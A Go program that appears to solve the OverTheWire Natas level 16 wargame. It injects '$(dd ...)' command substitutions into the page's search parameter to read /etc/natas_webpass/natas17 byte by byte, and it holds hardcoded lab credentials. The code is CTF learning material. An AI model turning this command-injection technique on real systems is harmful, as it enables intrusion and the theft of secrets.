package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// ..zt

func main() {
	// chars := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	key := ""

	host := "natas16:3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L@natas16.natas.labs.overthewire.org"
	fname := "/etc/natas_webpass/natas17"

	for i := 0; i < 35; i++ {
		cmd := fmt.Sprintf("$(dd skip=%d count=1 bs=1 if=%v)$", i, fname)

		fmt.Printf("cmd:%v\n", cmd)

		query := url.QueryEscape(cmd)

		fmt.Printf("query:%v\n", query)

		before := time.Now()
		resp, err := http.Get(fmt.Sprintf("http://%v/?needle=%v", host, query))
		if err != nil {
			// handle error
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		output := string(body)

		pre := strings.Index(output, "<pre>")
		post := strings.Index(output, "</pre>")

		fmt.Printf("pre: %d\n", pre)
		fmt.Printf("post: %d\n", post)

		between := output[pre+len("<pre>") : post]
		betweenArr := strings.Split(between, "\n")

		if len(betweenArr) >= 10 {
			// fmt.Printf("%v\n", betweenArr)
			ma := betweenArr[5]
			mb := betweenArr[7]
			mc := betweenArr[8]

			if strings.HasSuffix(ma, mb[len(mb)-1:]) && strings.HasSuffix(ma, mc[len(mc)-1:]) {
				fmt.Printf("could be: %v\n", ma[len(ma)-1:])
				key += ma[len(ma)-1:]
			} else {
				fmt.Printf("!!DUNNO!!")
				key += "?"
			}
		}

		after := time.Now()

		fmt.Printf("\n\n\nreturned %v\n%v\n\n", after.Sub(before), key)

	}
	//hbz?l?pagmaynfzchzoepsx???
}
